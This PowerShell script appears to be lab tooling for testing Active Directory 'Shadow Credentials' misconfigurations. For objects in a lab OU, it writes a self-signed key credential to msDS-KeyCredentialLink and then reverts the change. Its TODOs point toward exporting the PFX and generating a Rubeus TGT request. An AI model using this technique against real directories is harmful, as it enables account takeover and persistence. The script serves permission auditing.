function New-KeyCredentialValue {
    param(
        [Microsoft.ActiveDirectory.Management.ADObject]$AdObject
    )

    if (-not $AdObject) {
        return $null
    }

    # TODO: Store the certificate in the current working directory as a base64-encoded PFX certificate export. The file name should be ($ADObject.Name).pfx
    $certificateParams = @{
        Subject            = 'itdoesnotreallymatteratall'
        KeyLength          = 2048
        Provider           = 'Microsoft Strong Cryptographic Provider'
        CertStoreLocation  = 'Cert:\CurrentUser\My'
        NotAfter           = (Get-Date).AddYears(5)
        TextExtension      = @('2.5.29.19={text}false', '2.5.29.37={text}1.3.6.1.4.1.311.20.2.2')
        SuppressOid        = '2.5.29.14'
        KeyUsage           = 'None'
        KeyExportPolicy    = 'Exportable'
       # HashAlgorithm      = 'SHA256'
    }

    $certificate = New-SelfSignedCertificate @certificateParams
    if (-not $certificate) {
        Write-Warning ("    Unable to generate self-signed certificate for {0}; skipping key credential write." -f $AdObject.Name)
        return $null
    }

    try {
        $keyParams = @{
            Certificate = $certificate
            OwnerDN     = $AdObject.DistinguishedName
            IsComputerKey = $true
        }

        $ngcKey = Get-ADKeyCredential @keyParams
        if (-not $ngcKey) {
            Write-Warning ("    Unable to create key credential for {0}." -f $AdObject.Name)
            return $null
        }

        return $ngcKey.ToDNWithBinary()
    } catch {
        Write-Warning ("    Failed to build key credential value for {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
        return $null
    } finally {
        if ($certificate) {
            try {
                Remove-Item -LiteralPath ("Cert:\CurrentUser\My\{0}" -f $certificate.Thumbprint) -Force -ErrorAction SilentlyContinue
            } catch {
                Write-Verbose ("Unable to remove temporary certificate {0}: {1}" -f $certificate.Thumbprint, $_.Exception.Message)
            }
        }
    }
}

function Invoke-KeyCredentialWriteTest {
    param(
        [Microsoft.ActiveDirectory.Management.ADObject]$AdObject
    )

    $dn = $AdObject.DistinguishedName
    $sam = $AdObject.SamAccountName
    $keyCredentialValue = New-KeyCredentialValue -AdObject $AdObject
    if (-not $keyCredentialValue) {
        Write-Warning ("    Failed to construct DN-Binary value for {0}; skipping msDS-KeyCredentialLink write." -f $AdObject.Name)
        return
    }

    $addSucceeded = $false
    try {
        Set-ADObject -Identity $dn -Clear 'msDS-KeyCredentialLink' -Add @{ 'msDS-KeyCredentialLink' = $keyCredentialValue } -ErrorAction Stop
        $addSucceeded = $true
        Write-Host "    Added msDS-KeyCredentialLink."
    } catch {
        Write-Warning ("    Failed to modify msDS-KeyCredentialLink on {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
    } finally {
        if ($addSucceeded) {
            # TODO if add succeeds, output the command needed to create a TGT using the credential in Rubeus
            try {
                Set-ADObject -Identity $dn -Remove @{ 'msDS-KeyCredentialLink' = $keyCredentialValue } -ErrorAction Stop
                Write-Host "    Removed placeholder msDS-KeyCredentialLink to revert state."
            } catch {
                Write-Warning ("    Unable to clean up msDS-KeyCredentialLink on {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
            }
        }
    }
}


$propertiesToLoad = @(
    'objectClass',
    'dNSHostName',
    'msDS-AdditionalDnsHostName',
    'servicePrincipalName',
    'msDS-KeyCredentialLink',
    'samAccountName',
    'msDS-AdditionalSamAccountName',
    'objectSid',
    'nTSecurityDescriptor',
    'msDS-KeyCredentialLink'
)


$OU = 'OU=ShadowCreds,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan'
$rawObjects = Get-ADObject -SearchBase $OU -SearchScope OneLevel -Filter * -Properties $propertiesToLoad -ErrorAction Stop | Sort-Object -Property Name